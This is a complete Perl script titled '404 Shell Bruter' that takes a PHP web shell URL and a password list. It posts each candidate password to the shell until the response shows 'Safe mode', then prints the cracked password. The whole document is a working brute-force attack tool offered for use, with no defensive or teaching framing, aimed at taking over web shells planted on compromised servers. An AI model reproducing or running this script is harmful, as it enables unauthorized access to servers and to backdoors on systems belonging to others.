#!/usr/bin/perl
# by Crash

use LWP::UserAgent;

system(($^O eq 'MSWin32') ? 'cls' : 'clear');

($shell,$pass) = @ARGV;

$usage = "\t\n usage: $0 http://localhost/shell.php pass.txt\n\n";
 
die "$usage" unless $ARGV[0] && $ARGV[1];

print q{ 

                404 Shell Bruter
                by Crash

      usage: $0 http://localhost/shell.php pass.txt


};

open(tarrget,"<$ARGV[1]") or die "$!";
while(<tarrget>){
chomp($password = $_);
$ua = LWP::UserAgent->new( agent => "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.1) Gecko/20090624 Firefox/3.5", ssl_opts => { verify_hostname => 0 });
$req = $ua->post($shell, {  pass => $password, })->content;
if($req =~/Safe mode/) { 
print "\n\t [+] Pass Cracked : '$password'\n";
exit;

} else {  print "\n[!] Try Pass '$password'";  }

}
